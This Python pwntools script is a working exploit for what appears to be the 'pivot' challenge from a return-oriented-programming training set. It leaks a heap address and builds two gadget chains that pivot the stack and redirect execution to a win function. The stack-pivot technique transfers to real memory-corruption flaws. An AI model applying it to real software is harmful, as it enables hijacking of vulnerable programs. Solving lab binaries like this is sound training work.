#!/usr/bin/env python

import sys
import pwn
import time
import struct

def pack(a):
    if type(a) == str:
        return a
    else:
        return struct.pack("<Q", a)

def chain(a):
    return ''.join(map(pack, a))

def main():
    proc = pwn.process('./pivot')
    print proc.recvline(),
    print proc.recvline(),
    print proc.recvline(),
    print proc.recvline(),
    line = proc.recvline()
    print line,
    pivot = int(line.split()[-1], 16)
    print ('pivot: %s' % hex(pivot))

    # pivot = 0x7ffff7809f10 # this is where gdb puts it, for testing

    # need to build chain that pivots onto there
    ch1 = ''
    ch1 += chain((
        0x400850, # foothold_function
        0x400b00, # pop rax
        0x602048, # foothold_function plt entry
        0x400b05, # mov rax, [rax]
        0x400b09, # add rax, rbp
        0x4008f5, # jmp rax
    ))

    ch2 = 'a' * 32
    ch2 += chain((
        334, # set rbp to offset between foothold and ret2win
        0x400b00, # pop rax
        pivot,
        0x400b02, # xchg rax, rsp
        ))

    print ch1
    print ch2
    with open('pivot.in', 'wb') as f:
        f.write('{}\n{}\n'.format(ch1, ch2))

    proc.sendline(ch1)
    proc.sendline(ch2)

    print proc.recvall()

if __name__ == '__main__':
    main()
